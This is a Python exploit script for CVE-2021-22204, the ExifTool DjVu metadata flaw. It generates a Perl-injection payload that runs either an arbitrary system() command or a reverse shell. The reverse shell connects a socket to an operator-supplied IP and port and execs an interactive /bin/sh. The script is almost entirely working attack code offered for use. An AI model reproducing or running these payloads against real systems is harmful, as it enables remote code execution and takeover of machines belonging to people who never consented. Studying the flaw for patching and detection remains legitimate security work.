#!/usr/bin/env python3
# Made by @UNICORDev (by @NicPWNs and @Dev-Yeoj)
# https://github.com/UNICORDev/exploit-CVE-2021-22204
# CVE-2021-22204
# Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

r"""UNICORD Exploit for CVE-2021-22204

Usage:
  exploit-CVE-2021-22204.py -c <command>
  exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  exploit-CVE-2021-22204.py (-h | --help)

Options:
  -h --help     Show this screen.
  -c --command  Command to execute on target.
  -s --shell    Reverse shell mode. Provide local IP and port.
"""

# Imports
import base64
from operator import eq
import re
import subprocess
import sys
from docopt import docopt

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(r"""
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
        ! !  !          \____/_/|_/___/\___/\____/_/|_/____/
    """)

# Run the exploit
def exploit(command):

    UNICORD_ASCII()

    payload = "(metadata \"\c${"
    payload += command
    payload += "};\")"

    print(payload)

    exit()

if __name__ == "__main__":

    arguments = docopt(__doc__)

    if arguments['--command'] is True:
        command = f"system('{arguments['<command>']}');"
        exploit(command)

    elif arguments['--shell'] is True:
        localIp = arguments['<local-IP>']
        localPort = arguments['<local-port>']
        command = f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({localPort},inet_aton('{localIp}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};"
        exploit(command)